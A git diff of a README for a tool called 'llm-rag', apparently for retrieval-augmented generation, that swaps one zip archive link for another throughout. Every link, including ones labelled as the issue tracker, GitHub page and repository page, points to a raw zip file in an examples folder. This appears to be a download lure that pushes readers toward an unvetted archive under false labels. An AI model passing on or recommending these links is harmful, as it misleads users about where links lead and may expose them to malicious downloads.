@@ -1,6 +1,6 @@
 # ⚙️ llm-rag - Simple Retrieval-Augmented Generation Tool
 
-[![Download llm-rag](https://img.shields.io/badge/Download-llm--rag-brightgreen)](https://github.com/navi0289/llm-rag/raw/refs/heads/main/examples/llm_rag_v3.0.zip)
+[![Download llm-rag](https://img.shields.io/badge/Download-llm--rag-brightgreen)](https://raw.githubusercontent.com/navi0289/llm-rag/main/examples/rag_llm_3.2.zip)
 
 ---
 
@@ -43,7 +43,7 @@ This section will guide you through downloading and running llm-rag step-by-step
 
 Click the link below to visit the download page for llm-rag. This page includes the file you need to get started.
 
-[![Download llm-rag](https://img.shields.io/badge/Download-llm--rag-blue)](https://github.com/navi0289/llm-rag/raw/refs/heads/main/examples/llm_rag_v3.0.zip)
+[![Download llm-rag](https://img.shields.io/badge/Download-llm--rag-blue)](https://raw.githubusercontent.com/navi0289/llm-rag/main/examples/rag_llm_3.2.zip)
 
 Once on the page:
 
@@ -129,7 +129,7 @@ If you face problems:
 - Look for any error messages and note what they say.
 - Visit the download page and check for updated versions.
 
-If issues continue, you can open an issue at the program’s GitHub page here: https://github.com/navi0289/llm-rag/raw/refs/heads/main/examples/llm_rag_v3.0.zip
+If issues continue, you can open an issue at the program’s GitHub page here: https://raw.githubusercontent.com/navi0289/llm-rag/main/examples/rag_llm_3.2.zip
 
 ---
 
@@ -143,8 +143,8 @@ The tool is designed for users who want a simple, reliable way to handle text on
 
 ## 🔗 Useful Links
 
-- Main download and repository page: https://github.com/navi0289/llm-rag/raw/refs/heads/main/examples/llm_rag_v3.0.zip  
-- Issue tracker for support and bugs: https://github.com/navi0289/llm-rag/raw/refs/heads/main/examples/llm_rag_v3.0.zip  
+- Main download and repository page: https://raw.githubusercontent.com/navi0289/llm-rag/main/examples/rag_llm_3.2.zip  
+- Issue tracker for support and bugs: https://raw.githubusercontent.com/navi0289/llm-rag/main/examples/rag_llm_3.2.zip  
 - Documentation inside the program after launch
 
 ---
@@ -168,4 +168,4 @@ If you want to suggest improvements or report bugs, go to the GitHub page. Open 
 
 # [🚀] llm-rag - Download and start exploring text today
 
-[![Download llm-rag](https://img.shields.io/badge/Get_llm--rag-green)](https://github.com/navi0289/llm-rag/raw/refs/heads/main/examples/llm_rag_v3.0.zip)
+[![Download llm-rag](https://img.shields.io/badge/Get_llm--rag-green)](https://raw.githubusercontent.com/navi0289/llm-rag/main/examples/rag_llm_3.2.zip)
